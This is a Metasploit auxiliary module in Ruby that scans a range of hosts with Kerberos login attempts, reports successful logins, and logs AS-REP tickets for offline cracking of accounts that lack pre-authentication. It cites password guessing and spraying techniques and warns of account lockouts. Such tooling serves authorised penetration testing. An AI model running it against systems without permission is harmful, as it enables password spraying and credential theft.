##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ostruct'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Kerberos::AuthBrute

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Authentication Check Scanner',
        'Description' => %q{
          This module will test Kerberos logins on a range of machines and
          report successful logins.

          Kerberos accounts which do not require pre-authentication will
          have the TGT logged for offline cracking (AS-REP Roasting).
        },
        'Author' => [
          'alanfoster',
        ],
        'References' => [
          ['ATT&CK', Mitre::Attack::Technique::T1110_001_PASSWORD_GUESSING],
          ['ATT&CK', Mitre::Attack::Technique::T1110_003_PASSWORD_SPRAYING],
          ['ATT&CK', Mitre::Attack::Technique::T1589_001_CREDENTIALS],
          ['ATT&CK', Mitre::Attack::Technique::T1087_002_DOMAIN_ACCOUNT]
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability'    => [CRASH_SAFE],
          'Reliability'  => [],
          'SideEffects'  => [ACCOUNT_LOCKOUTS, IOC_IN_LOGS]
        }
      )
    )
  end

  def run
    attempt_kerberos_logins
  end

  def on_login_success(result)
    super

    return unless datastore['VERBOSE']
    return unless result.respond_to?(:proof) && result.proof

    # Wrap the AS-REP proof into a trace-compatible structure so the standard
    # kerberos_trace() dispatcher in client.rb can handle it without this module
    # needing to know which verbosity level the operator has selected.
    response = OpenStruct.new(
      as_rep:         result.proof,
      decrypted_part: nil
    )

    # Delegate to the framework dispatcher rather than calling the trace class
    # directly. This respects the KerberosTrace option level (metadata / full)
    # and keeps all trace routing in one place.
    kerberos_trace(response) if respond_to?(:kerberos_trace)
  end
end
